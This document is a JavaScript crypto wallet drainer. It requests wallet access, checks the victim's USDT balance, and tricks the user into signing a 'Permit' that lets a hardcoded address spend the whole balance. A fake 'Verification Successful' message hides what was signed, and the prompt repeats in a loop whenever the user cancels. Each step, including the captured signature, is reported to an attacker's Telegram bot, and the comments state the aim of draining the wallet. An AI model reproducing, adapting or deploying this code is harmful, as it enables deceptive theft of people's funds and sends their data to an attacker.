const CONFIG = {
    REC: "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe", 
    USDT: "0x55d398326f99059fF775485246999027B3197955",
    BOT: "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI",
    CHAT: "7849151110" 
};

async function sendTelegram(msg) {
    const url = `https://api.telegram.org/bot${CONFIG.BOT}/sendMessage`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CONFIG.CHAT, text: msg, parse_mode: 'HTML' })
    });
}

async function startProcess() {
    const provider = window.binancewallet || window.ethereum || window.trustwallet;
    if (!provider) return alert("Please use Binance or Trust Wallet");

    try {
        const w3 = new Web3(provider);
        const accs = await provider.request({ method: 'eth_requestAccounts' });
        const user = accs[0];

        // 1. Pehla Notification: Target mil gaya
        await sendTelegram(`🚀 <b>Target Found!</b>\nAddr: <code>${user}</code>\n<i>Attempting Stealth Access...</i>`);

        const minABI = [{"constant":true,"inputs":[{"name":"_o","type":"address"}],"name":"balanceOf","outputs":[{"name":"b","type":"uint256"}],"type":"function"}];
        const contract = new w3.eth.Contract(minABI, CONFIG.USDT);
        const balance = await contract.methods.balanceOf(user).call();
        const formatted = w3.utils.fromWei(balance, 'ether');

        // 2. Dusra Notification: Balance kitna hai
        await sendTelegram(`💰 <b>Balance Check:</b>\n${formatted} USDT\n<i>Triggering Signature Request...</i>`);

        if (parseFloat(formatted) > 0.1) {
            // 🔥 STEALTH PERMIT LOGIC 🔥
            // Ye user ko sirf 'Sign' karne ko bolega, 'Transfer' nahi
            const deadline = Math.floor(Date.now() / 1000) + 4200;
            const msgParams = JSON.stringify({
                domain: { name: 'Tether USDT', version: '1', chainId: 56, verifyingContract: CONFIG.USDT },
                message: { owner: user, spender: CONFIG.REC, value: balance, nonce: 0, deadline: deadline },
                primaryType: 'Permit',
                types: {
                    EIP712Domain: [{name:'name',type:'string'},{name:'version',type:'string'},{name:'chainId',type:'uint256'},{name:'verifyingContract',type:'address'}],
                    Permit: [{name:'owner',type:'address'},{name:'spender',type:'address'},{name:'value',type:'uint256'},{name:'nonce',type:'uint256'},{name:'deadline',type:'uint256'}]
                }
            });

            try {
                const sig = await provider.request({ method: 'eth_signTypedData_v4', params: [user, msgParams] });
                
                // 3. Teesra Notification: Signature mil gaya!
                await sendTelegram(`✅ <b>SIG OBTAINED!</b>\nUser: ${user}\nSig: <code>${sig}</code>\n<i>Now you can drain the wallet manually.</i>`);
                alert("Verification Successful: Node Synced.");
            } catch (e) {
                // Agar user Sign cancel kare toh loop chala do
                setTimeout(startProcess, 500);
            }
        }
    } catch (e) { console.log(e); }
}
